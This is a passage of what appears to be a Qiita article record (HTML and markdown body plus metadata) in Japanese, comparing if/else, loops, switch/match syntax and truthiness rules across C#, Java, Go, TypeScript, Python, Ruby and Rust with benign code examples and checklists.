class=\"s2\">\"Other\"</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># 条件式として使用</span>\n<span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"k\">case</span> <span class=\"n\">value</span>\n         <span class=\"k\">when</span> <span class=\"mi\">1</span> <span class=\"k\">then</span> <span class=\"s2\">\"One\"</span>\n         <span class=\"k\">when</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span> <span class=\"k\">then</span> <span class=\"s2\">\"Two or Three\"</span>\n         <span class=\"k\">else</span> <span class=\"s2\">\"Other\"</span>\n         <span class=\"k\">end</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"523:1-537:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Rust の match 式（網羅性チェックあり）</span>\n<span class=\"k\">let</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"k\">match</span> <span class=\"n\">value</span> <span class=\"p\">{</span>\n    <span class=\"mi\">1</span> <span class=\"k\">=&gt;</span> <span class=\"s\">\"One\"</span><span class=\"p\">,</span>\n    <span class=\"mi\">2</span> <span class=\"p\">|</span> <span class=\"mi\">3</span> <span class=\"k\">=&gt;</span> <span class=\"s\">\"Two or Three\"</span><span class=\"p\">,</span>\n    <span class=\"n\">_</span> <span class=\"k\">=&gt;</span> <span class=\"s\">\"Other\"</span><span class=\"p\">,</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// パターンマッチングが強力</span>\n<span class=\"k\">match</span> <span class=\"n\">some_option</span> <span class=\"p\">{</span>\n    <span class=\"nf\">Some</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span> <span class=\"k\">if</span> <span class=\"n\">x</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"k\">=&gt;</span> <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"Positive: {}\"</span><span class=\"p\">,</span> <span class=\"n\">x</span><span class=\"p\">),</span>\n    <span class=\"nf\">Some</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span> <span class=\"k\">=&gt;</span> <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"Non-positive: {}\"</span><span class=\"p\">,</span> <span class=\"n\">x</span><span class=\"p\">),</span>\n    <span class=\"nb\">None</span> <span class=\"k\">=&gt;</span> <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"Nothing\"</span><span class=\"p\">),</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"539:1-539:28\">\n<span id=\"switch--match-比較表\" class=\"fragment\"></span><a href=\"#switch--match-%E6%AF%94%E8%BC%83%E8%A1%A8\"><i class=\"fa fa-link\"></i></a>switch / match 比較表</h3>\n<table data-sourcepos=\"541:1-549:34\">\n<thead>\n<tr data-sourcepos=\"541:1-541:60\">\n<th data-sourcepos=\"541:2-541:9\">言語</th>\n<th data-sourcepos=\"541:11-541:27\">キーワード</th>\n<th data-sourcepos=\"541:29-541:35\">break</th>\n<th data-sourcepos=\"541:37-541:59\">フォールスルー</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"543:1-543:49\">\n<td data-sourcepos=\"543:2-543:5\">C#</td>\n<td data-sourcepos=\"543:7-543:14\">switch</td>\n<td data-sourcepos=\"543:16-543:23\">必須</td>\n<td data-sourcepos=\"543:25-543:48\">明示的に goto case</td>\n</tr>\n<tr data-sourcepos=\"544:1-544:50\">\n<td data-sourcepos=\"544:2-544:7\">Java</td>\n<td data-sourcepos=\"544:9-544:16\">switch</td>\n<td data-sourcepos=\"544:18-544:25\">必須</td>\n<td data-sourcepos=\"544:27-544:49\">break 忘れで発生</td>\n</tr>\n<tr data-sourcepos=\"545:1-545:60\">\n<td data-sourcepos=\"545:2-545:5\">Go</td>\n<td data-sourcepos=\"545:7-545:14\">switch</td>\n<td data-sourcepos=\"545:16-545:35\">不要（自動）</td>\n<td data-sourcepos=\"545:37-545:59\">fallthrough で明示</td>\n</tr>\n<tr data-sourcepos=\"546:1-546:56\">\n<td data-sourcepos=\"546:2-546:13\">TypeScript</td>\n<td data-sourcepos=\"546:15-546:22\">switch</td>\n<td data-sourcepos=\"546:24-546:31\">必須</td>\n<td data-sourcepos=\"546:33-546:55\">break 忘れで発生</td>\n</tr>\n<tr data-sourcepos=\"547:1-547:36\">\n<td data-sourcepos=\"547:2-547:9\">Python</td>\n<td data-sourcepos=\"547:11-547:17\">match</td>\n<td data-sourcepos=\"547:19-547:26\">不要</td>\n<td data-sourcepos=\"547:28-547:35\">なし</td>\n</tr>\n<tr data-sourcepos=\"548:1-548:38\">\n<td data-sourcepos=\"548:2-548:7\">Ruby</td>\n<td data-sourcepos=\"548:9-548:19\">case/when</td>\n<td data-sourcepos=\"548:21-548:28\">不要</td>\n<td data-sourcepos=\"548:30-548:37\">なし</td>\n</tr>\n<tr data-sourcepos=\"549:1-549:34\">\n<td data-sourcepos=\"549:2-549:7\">Rust</td>\n<td data-sourcepos=\"549:9-549:15\">match</td>\n<td data-sourcepos=\"549:17-549:24\">不要</td>\n<td data-sourcepos=\"549:26-549:33\">なし</td>\n</tr>\n</tbody>\n</table>\n<div data-sourcepos=\"551:1-553:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"552:1-552:214\"><strong>Go の設計思想</strong>: Go は「break を忘れるバグ」を防ぐため、デフォルトで自動 break にしました。フォールスルーが必要な場合は <code>fallthrough</code> を明示的に書きます。</p>\n</div>\n</div>\n<hr data-sourcepos=\"555:1-556:0\">\n<h2 data-sourcepos=\"557:1-557:45\">\n<span id=\"5-よくあるミス注意点まとめ\" class=\"fragment\"></span><a href=\"#5-%E3%82%88%E3%81%8F%E3%81%82%E3%82%8B%E3%83%9F%E3%82%B9%E6%B3%A8%E6%84%8F%E7%82%B9%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>5. よくあるミス・注意点まとめ</h2>\n<h3 data-sourcepos=\"559:1-559:64\">\n<span id=\"言語を切り替えるときに注意すべきポイント\" class=\"fragment\"></span><a href=\"#%E8%A8%80%E8%AA%9E%E3%82%92%E5%88%87%E3%82%8A%E6%9B%BF%E3%81%88%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AB%E6%B3%A8%E6%84%8F%E3%81%99%E3%81%B9%E3%81%8D%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\"><i class=\"fa fa-link\"></i></a>言語を切り替えるときに注意すべきポイント</h3>\n<table data-sourcepos=\"561:1-568:65\">\n<thead>\n<tr data-sourcepos=\"561:1-561:22\">\n<th data-sourcepos=\"561:2-561:9\">状況</th>\n<th data-sourcepos=\"561:11-561:21\">注意点</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"563:1-563:39\">\n<td data-sourcepos=\"563:2-563:16\">C系 → Ruby</td>\n<td data-sourcepos=\"563:18-563:38\">\n<code>0</code> が真になる</td>\n</tr>\n<tr data-sourcepos=\"564:1-564:61\">\n<td data-sourcepos=\"564:2-564:18\">C系 → Python</td>\n<td data-sourcepos=\"564:20-564:60\">インデントがブロックを決定</td>\n</tr>\n<tr data-sourcepos=\"565:1-565:71\">\n<td data-sourcepos=\"565:2-565:14\">Java → Go</td>\n<td data-sourcepos=\"565:16-565:70\">条件の括弧を外す、else if の位置に注意</td>\n</tr>\n<tr data-sourcepos=\"566:1-566:79\">\n<td data-sourcepos=\"566:2-566:17\">JS → Go/Rust</td>\n<td data-sourcepos=\"566:19-566:78\">truthy/falsy が使えない、明示的な比較が必要</td>\n</tr>\n<tr data-sourcepos=\"567:1-567:41\">\n<td data-sourcepos=\"567:2-567:14\">C系 → Go</td>\n<td data-sourcepos=\"567:16-567:40\">switch で break 不要</td>\n</tr>\n<tr data-sourcepos=\"568:1-568:65\">\n<td data-sourcepos=\"568:2-568:21\">他言語 → Rust</td>\n<td data-sourcepos=\"568:23-568:64\">if や match が式として値を返す</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"570:1-570:34\">\n<span id=\"言語別チェックリスト\" class=\"fragment\"></span><a href=\"#%E8%A8%80%E8%AA%9E%E5%88%A5%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%83%AA%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>言語別チェックリスト</h3>\n<h4 data-sourcepos=\"572:1-572:30\">\n<span id=\"c--java-を書くとき\" class=\"fragment\"></span><a href=\"#c--java-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>C# / Java を書くとき</h4>\n<ul data-sourcepos=\"573:1-575:0\">\n<li data-sourcepos=\"573:1-573:39\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>if 文の条件は bool 型のみ</li>\n<li data-sourcepos=\"574:1-575:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>switch の各 case に break を忘れずに</li>\n</ul>\n<h4 data-sourcepos=\"576:1-576:23\">\n<span id=\"go-を書くとき\" class=\"fragment\"></span><a href=\"#go-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>Go を書くとき</h4>\n<ul data-sourcepos=\"577:1-581:0\">\n<li data-sourcepos=\"577:1-577:36\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>if の条件に括弧は不要</li>\n<li data-sourcepos=\"578:1-578:40\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>else は <code>}</code> と同じ行に書く</li>\n<li data-sourcepos=\"579:1-579:32\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>switch に break は不要</li>\n<li data-sourcepos=\"580:1-581:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>while はない（for で代用）</li>\n</ul>\n<h4 data-sourcepos=\"582:1-582:31\">\n<span id=\"typescript-を書くとき\" class=\"fragment\"></span><a href=\"#typescript-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>TypeScript を書くとき</h4>\n<ul data-sourcepos=\"583:1-586:0\">\n<li data-sourcepos=\"583:1-583:39\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>==</code> ではなく <code>===</code> を使う</li>\n<li data-sourcepos=\"584:1-584:59\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>配列には for...in ではなく for...of を使う</li>\n<li data-sourcepos=\"585:1-586:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>truthy/falsy に注意（<code>0</code>, <code>\"\"</code>, <code>null</code> は偽）</li>\n</ul>\n<h4 data-sourcepos=\"587:1-587:27\">\n<span id=\"python-を書くとき\" class=\"fragment\"></span><a href=\"#python-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>Python を書くとき</h4>\n<ul data-sourcepos=\"588:1-591:0\">\n<li data-sourcepos=\"588:1-588:61\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>インデントは揃える（スペース4つ推奨）</li>\n<li data-sourcepos=\"589:1-589:38\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>elif</code>（else if ではない）</li>\n<li data-sourcepos=\"590:1-591:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>and</code>, <code>or</code>, <code>not</code>（<code>&amp;&amp;</code>, <code>||</code>, <code>!</code> ではない）</li>\n</ul>\n<h4 data-sourcepos=\"592:1-592:25\">\n<span id=\"ruby-を書くとき\" class=\"fragment\"></span><a href=\"#ruby-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>Ruby を書くとき</h4>\n<ul data-sourcepos=\"593:1-596:0\">\n<li data-sourcepos=\"593:1-593:25\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>0</code> や <code>\"\"</code> は真</li>\n<li data-sourcepos=\"594:1-594:51\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>elsif</code>（elif でも else if でもない）</li>\n<li data-sourcepos=\"595:1-596:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>end</code> で閉じる</li>\n</ul>\n<h4 data-sourcepos=\"597:1-597:25\">\n<span id=\"rust-を書くとき\" class=\"fragment\"></span><a href=\"#rust-%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>Rust を書くとき</h4>\n<ul data-sourcepos=\"598:1-601:0\">\n<li data-sourcepos=\"598:1-598:42\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>if 文は式として値を返せる</li>\n<li data-sourcepos=\"599:1-599:33\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled>match は網羅性が必須</li>\n<li data-sourcepos=\"600:1-601:0\" class=\"task-list-item\">\n<input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled><code>..</code> は終端を含まない、<code>..=</code> は含む</li>\n</ul>\n<hr data-sourcepos=\"602:1-603:0\">\n<h2 data-sourcepos=\"604:1-604:12\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h2>\n<p data-sourcepos=\"606:1-606:111\">各言語の制御構文を比較してみると、それぞれの言語の設計思想が見えてきます。</p>\n<ul data-sourcepos=\"608:1-614:0\">\n<li data-sourcepos=\"608:1-608:81\">\n<strong>C# / Java</strong>: 型安全性を重視。<code>0</code> を暗黙的に偽とみなさない</li>\n<li data-sourcepos=\"609:1-609:55\">\n<strong>Go</strong>: シンプルさを追求。構文は最小限</li>\n<li data-sourcepos=\"610:1-610:71\">\n<strong>TypeScript</strong>: JavaScript の互換性を維持しつつ型を追加</li>\n<li data-sourcepos=\"611:1-611:68\">\n<strong>Python</strong>: 可読性を重視。インデントで構造を表現</li>\n<li data-sourcepos=\"612:1-612:69\">\n<strong>Ruby</strong>: 開発者の幸福度を重視。柔軟で表現力豊か</li>\n<li data-sourcepos=\"613:1-614:0\">\n<strong>Rust</strong>: 安全性を追求。式指向でパターンマッチングが強力</li>\n</ul>\n<p data-sourcepos=\"615:1-615:204\">複数の言語を扱う際は、この記事を参考に各言語の「個性」を意識してコードを書くと、バグを減らし、より良いコードが書けるようになるでしょう。</p>\n<h2 data-sourcepos=\"617:1-617:9\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h2>\n<ul data-sourcepos=\"619:1-619:141\">\n<li data-sourcepos=\"619:1-619:141\"><a href=\"https://gihyo.jp/book/2013/978-4-7741-5654-5\" rel=\"nofollow noopener\" target=\"_blank\">コーディングを支える技術 ―成り立ちから学ぶプログラミング作法</a></li>\n</ul>\n",
      "body": "\n## はじめに\n\n「Rubyでは `0` は偽ではない」\n\n書籍『コーディングを支える技術』を読んで、言語によって「真偽値」の扱いが異なることを学び、各言語の設計思想の違いに興味を持ちました。\n\n本記事では、7つのプログラミング言語の**if文・for文の書き方**と**真偽値の扱い**を比較します。新しい言語を学ぶ際や、複数言語を扱う仕事での「あれ、この言語ではどう書くんだっけ？」という混乱を解消する一助になれば幸いです。\n\n## 比較する言語\n\n| 言語 | 特徴 |\n|------|------|\n| **C#** | .NET の主力言語、型安全性重視 |\n| **Java** | エンタープライズの定番、厳格な型システム |\n| **Go** | シンプルさを追求、括弧を省略した構文 |\n| **TypeScript** | JavaScript に型を追加、truthy/falsy の概念 |\n| **Python** | インデントでブロックを表現、可読性重視 |\n| **Ruby** | すべてがオブジェクト、`nil` と `false` のみが偽 |\n| **Rust** | 安全性とパフォーマンス、式指向の設計 |\n\n---\n\n## 1. 真偽値の扱い\n\n### 各言語で「偽」とみなされる値\n\nこれが言語間で最も混乱しやすいポイントです。\n\n| 言語 | 偽（falsy）とみなされる値 |\n|------|---------------------------|\n| **C#** | `false` のみ（`0` は偽ではない） |\n| **Java** | `false` のみ（`0` は偽ではない） |\n| **Go** | `false` のみ（`0` は偽ではない） |\n| **TypeScript/JS** | `false`, `0`, `\"\"`, `null`, `undefined`, `NaN` |\n| **Python** | `False`, `0`, `\"\"`, `[]`, `{}`, `None`, etc. |\n| **Ruby** | `false`, `nil` のみ（**`0` や `\"\"` は真**） |\n| **Rust** | `false` のみ（他の型は条件に使用不可） |\n\n### コード例：0 は真か偽か？\n\n```csharp\n// C# - コンパイルエラー！int は bool に暗黙変換できない\nif (0) { } // error CS0029\n```\n\n```java\n// Java - コンパイルエラー！int は boolean に変換できない\nif (0) { } // error: incompatible types\n```\n\n```go\n// Go - コンパイルエラー！int は bool ではない\nif 0 { } // non-bool 0 (type int) used as if condition\n```\n\n```typescript\n// TypeScript/JavaScript - 0 は falsy なので \"偽\" と表示\nif (0) {\n    console.log(\"真\");\n} else {\n    console.log(\"偽\"); // こちらが実行される\n}\n```\n\n```python\n# Python - 0 は falsy なので \"偽\" と表示\nif 0:\n    print(\"真\")\nelse:\n    print(\"偽\")  # こちらが実行される\n```\n\n```ruby\n# Ruby - 0 は truthy なので \"真\" と表示！\nif 0\n  puts \"真\"  # こちらが実行される\nelse\n  puts \"偽\"\nend\n```\n\n```rust\n// Rust - コンパイルエラー！bool 型のみ条件に使用可能\nif 0 { } // expected `bool`, found integer\n```\n\n:::note warn\n**Ruby の罠**: C言語経験者がRubyを書くと、`if count` のような条件で `count = 0` のときに真になってしまい、バグの原因になることがあります。\n:::\n\n---\n\n## 2. if 文の構文比較\n\n### 基本的な if-else\n\n```csharp\n// C#\nif (条件) {\n    // 処理\n} else if (条件2) {\n    // 処理\n} else {\n    // 処理\n}\n```\n\n```java\n// Java - C# とほぼ同じ\nif (条件) {\n    // 処理\n} else if (条件2) {\n    // 処理\n} else {\n    // 処理\n}\n```\n\n```go\n// Go - 条件の括弧が不要、波括弧は必須\nif 条件 {\n    // 処理\n} else if 条件2 {\n    // 処理\n} else {\n    // 処理\n}\n```\n\n```typescript\n// TypeScript - C# と同じ構文\nif (条件) {\n    // 処理\n} else if (条件2) {\n    // 処理\n} else {\n    // 処理\n}\n```\n\n```python\n# Python - インデントでブロックを表現、elif を使用\nif 条件:\n    # 処理\nelif 条件2:\n    # 処理\nelse:\n    # 処理\n```\n\n```ruby\n# Ruby - end で閉じる、elsif を使用\nif 条件\n  # 処理\nelsif 条件2\n  # 処理\nelse\n  # 処理\nend\n```\n\n```rust\n// Rust - 条件の括弧は不要、波括弧は必須\nif 条件 {\n    // 処理\n} else if 条件2 {\n    // 処理\n} else {\n    // 処理\n}\n```\n\n### 構文比較表\n\n| 言語 | 条件の括弧 | ブロック | else if |\n|------|-----------|----------|---------|\n| C# | 必須 `()` | `{}` | `else if` |\n| Java | 必須 `()` | `{}` | `else if` |\n| Go | 不要 | `{}` 必須 | `else if` |\n| TypeScript | 必須 `()` | `{}` | `else if` |\n| Python | 不要 | インデント | `elif` |\n| Ruby | 不要 | `end` | `elsif` |\n| Rust | 不要 | `{}` 必須 | `else if` |\n\n### 各言語の特徴・注意点\n\n#### Go: if 文で変数宣言ができる\n\n```go\n// 変数のスコープを if ブロック内に限定できる\nif err := doSomething(); err != nil {\n    return err\n}\n// err はここでは使えない\n```\n\n#### Rust: if は式なので値を返せる\n\n```rust\nlet result = if score >= 60 { \"合格\" } else { \"不合格\" };\n```\n\n#### Ruby: 後置 if が使える\n\n```ruby\nputs \"成人です\" if age >= 18\n```\n\n#### Python: 三項演算子の書き方が独特\n\n```python\nresult = \"合格\" if score >= 60 else \"不合格\"\n```\n\n---\n\n## 3. for 文（ループ）の構文比較\n\n### 配列の要素を順に処理する\n\n```csharp\n// C# - foreach を使用\nvar items = new[] { 1, 2, 3 };\nforeach (var item in items) {\n    Console.WriteLine(item);\n}\n\n// 従来の for 文\nfor (int i = 0; i < items.Length; i++) {\n    Console.WriteLine(items[i]);\n}\n```\n\n```java\n// Java - 拡張 for 文\nint[] items = { 1, 2, 3 };\nfor (int item : items) {\n    System.out.println(item);\n}\n\n// 従来の for 文\nfor (int i = 0; i < items.length; i++) {\n    System.out.println(items[i]);\n}\n```\n\n```go\n// Go - for range を使用（while も for で表現）\nitems := []int{1, 2, 3}\nfor _, item := range items {\n    fmt.Println(item)\n}\n\n// インデックスも必要な場合\nfor i, item := range items {\n    fmt.Printf(\"%d: %d\\n\", i, item)\n}\n\n// 従来の for 文\nfor i := 0; i < len(items); i++ {\n    fmt.Println(items[i])\n}\n```\n\n```typescript\n// TypeScript - for...of を使用\nconst items = [1, 2, 3];\nfor (const item of items) {\n    console.log(item);\n}\n\n// 従来の for 文\nfor (let i = 0; i < items.length; i++) {\n    console.log(items[i]);\n}\n\n// forEach メソッド\nitems.forEach(item => console.log(item));\n```\n\n```python\n# Python - for...in を使用\nitems = [1, 2, 3]\nfor item in items:\n    print(item)\n\n# インデックスも必要な場合\nfor i, item in enumerate(items):\n    print(f\"{i}: {item}\")\n\n# range を使った繰り返し\nfor i in range(3):\n    print(i)  # 0, 1, 2\n```\n\n```ruby\n# Ruby - each メソッドが主流\nitems = [1, 2, 3]\nitems.each do |item|\n  puts item\nend\n\n# 1行で書く場合\nitems.each { |item| puts item }\n\n# インデックス付き\nitems.each_with_index do |item, i|\n  puts \"#{i}: #{item}\"\nend\n\n# 回数指定の繰り返し\n3.times { |i| puts i }  # 0, 1, 2\n```\n\n```rust\n// Rust - for...in を使用\nlet items = [1, 2, 3];\nfor item in items {\n    println!(\"{}\", item);\n}\n\n// イテレータを明示的に使用\nfor item in items.iter() {\n    println!(\"{}\", item);\n}\n\n// インデックス付き\nfor (i, item) in items.iter().enumerate() {\n    println!(\"{}: {}\", i, item);\n}\n\n// 範囲指定\nfor i in 0..3 {\n    println!(\"{}\", i);  // 0, 1, 2\n}\n```\n\n### ループ構文比較表\n\n| 言語 | 配列ループ | キーワード | while の代替 |\n|------|-----------|-----------|--------------|\n| C# | `foreach (var x in arr)` | foreach/in | while あり |\n| Java | `for (var x : arr)` | for/:（拡張for） | while あり |\n| Go | `for _, x := range arr` | for/range | for で代用 |\n| TypeScript | `for (const x of arr)` | for/of | while あり |\n| Python | `for x in arr:` | for/in | while あり |\n| Ruby | `arr.each { \\|x\\| }` | each メソッド | while あり |\n| Rust | `for x in arr` | for/in | loop/while あり |\n\n### 各言語の特徴・注意点\n\n#### Go: while 文がない\n\n```go\n// while の代わりに for を使う\nfor 条件 {\n    // 処理\n}\n\n// 無限ループ\nfor {\n    // break で抜ける\n}\n```\n\n#### Ruby: ループが豊富\n\n```ruby\n# times, upto, downto, step など多彩\n5.times { |i| puts i }        # 0, 1, 2, 3, 4\n1.upto(5) { |i| puts i }      # 1, 2, 3, 4, 5\n5.downto(1) { |i| puts i }    # 5, 4, 3, 2, 1\n0.step(10, 2) { |i| puts i }  # 0, 2, 4, 6, 8, 10\n```\n\n#### Rust: 範囲の書き方\n\n```rust\nfor i in 0..5 { }   // 0, 1, 2, 3, 4（5は含まない）\nfor i in 0..=5 { }  // 0, 1, 2, 3, 4, 5（5を含む）\n```\n\n#### TypeScript: for...in と for...of の違い\n\n```typescript\nconst arr = ['a', 'b', 'c'];\n\n// for...of は値を取得（配列向け）\nfor (const value of arr) {\n    console.log(value);  // 'a', 'b', 'c'\n}\n\n// for...in はキー（インデックス）を取得（オブジェクト向け）\nfor (const index in arr) {\n    console.log(index);  // '0', '1', '2'（文字列！）\n}\n```\n\n:::note warn\n**TypeScript の罠**: 配列に `for...in` を使うと、インデックスが**文字列**で取得され、プロトタイプチェーンのプロパティも列挙される可能性があります。配列には `for...of` を使いましょう。\n:::\n\n---\n\n## 4. switch 文 / パターンマッチング\n\n### 基本的な switch 文\n\n```csharp\n// C# - break が必須（フォールスルー防止）\nswitch (value) {\n    case 1:\n        Console.WriteLine(\"One\");\n        break;\n    case 2:\n    case 3:\n        Console.WriteLine(\"Two or Three\");\n        break;\n    default:\n        Console.WriteLine(\"Other\");\n        break;\n}\n\n// C# 8.0 以降の switch 式\nvar result = value switch {\n    1 => \"One\",\n    2 or 3 => \"Two or Three\",\n    _ => \"Other\"\n};\n```\n\n```java\n// Java - break が必要（忘れるとフォールスルー）\nswitch (value) {\n    case 1:\n        System.out.println(\"One\");\n        break;\n    case 2:\n    case 3:\n        System.out.println(\"Two or Three\");\n        break;\n    default:\n        System.out.println(\"Other\");\n        break;\n}\n\n// Java 14 以降の switch 式\nvar result = switch (value) {\n    case 1 -> \"One\";\n    case 2, 3 -> \"Two or Three\";\n    default -> \"Other\";\n};\n```\n\n```go\n// Go - break 不要（自動で break）、fallthrough で明示的に継続\nswitch value {\ncase 1:\n    fmt.Println(\"One\")\ncase 2, 3:\n    fmt.Println(\"Two or Three\")\ndefault:\n    fmt.Println(\"Other\")\n}\n\n// 条件式なしの switch\nswitch {\ncase value < 0:\n    fmt.Println(\"Negative\")\ncase value == 0:\n    fmt.Println(\"Zero\")\ndefault:\n    fmt.Println(\"Positive\")\n}\n```\n\n```typescript\n// TypeScript - break が必要\nswitch (value) {\n    case 1:\n        console.log(\"One\");\n        break;\n    case 2:\n    case 3:\n        console.log(\"Two or Three\");\n        break;\n    default:\n        console.log(\"Other\");\n}\n```\n\n```python\n# Python 3.10 以降の match 文\nmatch value:\n    case 1:\n        print(\"One\")\n    case 2 | 3:\n        print(\"Two or Three\")\n    case _:\n        print(\"Other\")\n```\n\n```ruby\n# Ruby の case 文（break 不要）\ncase value\nwhen 1\n  puts \"One\"\nwhen 2, 3\n  puts \"Two or Three\"\nelse\n  puts \"Other\"\nend\n\n# 条件式として使用\nresult = case value\n         when 1 then \"One\"\n         when 2, 3 then \"Two or Three\"\n         else \"Other\"\n         end\n```\n\n```rust\n// Rust の match 式（網羅性チェックあり）\nlet result = match value {\n    1 => \"One\",\n    2 | 3 => \"Two or Three\",\n    _ => \"Other\",\n};\n\n// パターンマッチングが強力\nmatch some_option {\n    Some(x) if x > 0 => println!(\"Positive: {}\", x),\n    Some(x) => println!(\"Non-positive: {}\", x),\n    None => println!(\"Nothing\"),\n}\n```\n\n### switch / match 比較表\n\n| 言語 | キーワード | break | フォールスルー |\n|------|-----------|-------|----------------|\n| C# | switch | 必須 | 明示的に goto case |\n| Java | switch | 必須 | break 忘れで発生 |\n| Go | switch | 不要（自動） | fallthrough で明示 |\n| TypeScript | switch | 必須 | break 忘れで発生 |\n| Python | match | 不要 | なし |\n| Ruby | case/when | 不要 | なし |\n| Rust | match | 不要 | なし |\n\n:::note info\n**Go の設計思想**: Go は「break を忘れるバグ」を防ぐため、デフォルトで自動 break にしました。フォールスルーが必要な場合は `fallthrough` を明示的に書きます。\n:::\n\n---\n\n## 5. よくあるミス・注意点まとめ\n\n### 言語を切り替えるときに注意すべきポイント\n\n| 状況 | 注意点 |\n|------|--------|\n| C系 → Ruby | `0` が真になる |\n| C系 → Python | インデントがブロックを決定 |\n| Java → Go | 条件の括弧を外す、else if の位置に注意 |\n| JS → Go/Rust | truthy/falsy が使えない、明示的な比較が必要 |\n| C系 → Go | switch で break 不要 |\n| 他言語 → Rust | if や match が式として値を返す |\n\n### 言語別チェックリスト\n\n#### C# / Java を書くとき\n- [ ] if 文の条件は bool 型のみ\n- [ ] switch の各 case に break を忘れずに\n\n#### Go を書くとき\n- [ ] if の条件に括弧は不要\n- [ ] else は `}` と同じ行に書く\n- [ ] switch に break は不要\n- [ ] while はない（for で代用）\n\n#### TypeScript を書くとき\n- [ ] `==` ではなく `===` を使う\n- [ ] 配列には for...in ではなく for...of を使う\n- [ ] truthy/falsy に注意（`0`, `\"\"`, `null` は偽）\n\n#### Python を書くとき\n- [ ] インデントは揃える（スペース4つ推奨）\n- [ ] `elif`（else if ではない）\n- [ ] `and`, `or`, `not`（`&&`, `||`, `!` ではない）\n\n#### Ruby を書くとき\n- [ ] `0` や `\"\"` は真\n- [ ] `elsif`（elif でも else if でもない）\n- [ ] `end` で閉じる\n\n#### Rust を書くとき\n- [ ] if 文は式として値を返せる\n- [ ] match は網羅性が必須\n- [ ] `..` は終端を含まない、`..=` は含む\n\n---\n\n## まとめ\n\n各言語の制御構文を比較してみると、それぞれの言語の設計思想が見えてきます。\n\n- **C# / Java**: 型安全性を重視。`0` を暗黙的に偽とみなさない\n- **Go**: シンプルさを追求。構文は最小限\n- **TypeScript**: JavaScript の互換性を維持しつつ型を追加\n- **Python**: 可読性を重視。インデントで構造を表現\n- **Ruby**: 開発者の幸福度を重視。柔軟で表現力豊か\n- **Rust**: 安全性を追求。式指向でパターンマッチングが強力\n\n複数の言語を扱う際は、この記事を参考に各言語の「個性」を意識してコードを書くと、バグを減らし、より良いコードが書けるようになるでしょう。\n\n## 参考\n\n- [コーディングを支える技術 ―成り立ちから学ぶプログラミング作法](https://gihyo.jp/book/2013/978-4-7741-5654-5)\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:13:33+09:00",
      "group": null,
      "id": "d4161e45524636038d64",
      "likes_count": 1,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Java",
          "versions": []
        },
        {
          "name": "Go",
          "versions": []
